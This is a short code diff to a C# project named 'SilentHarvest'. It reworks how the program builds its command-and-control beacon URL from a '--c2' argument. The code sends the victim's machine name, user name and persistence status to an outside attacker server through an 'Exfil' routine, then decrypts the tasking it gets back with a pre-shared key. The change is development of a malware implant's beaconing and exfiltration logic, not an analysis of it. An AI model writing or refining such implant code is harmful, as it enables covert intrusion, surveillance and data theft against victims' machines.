@@ -268,9 +268,12 @@ namespace SilentHarvest
             {
                 string bid = System.Uri.EscapeDataString(
                     Environment.MachineName + "-" + Environment.UserName);
-                string burl = c2.Replace("/gate", "/beacon") + "?id=" + bid +
-                              "&v=" + "1.0" + "&p=" +
-                              System.Uri.EscapeDataString(Stages.CheckPersistence(pname));
+                // derive the beacon URL robustly even if --c2 lacks /gate
+                string burl = c2.Contains("/gate")
+                    ? c2.Replace("/gate", "/beacon")
+                    : c2.TrimEnd('/') + "/beacon";
+                burl += "?id=" + bid + "&v=1.0&p=" +
+                        System.Uri.EscapeDataString(Stages.CheckPersistence(pname));
                 byte[] tb = Exfil.Get(burl);
                 if (tb != null && pskBytes != null)
                 {
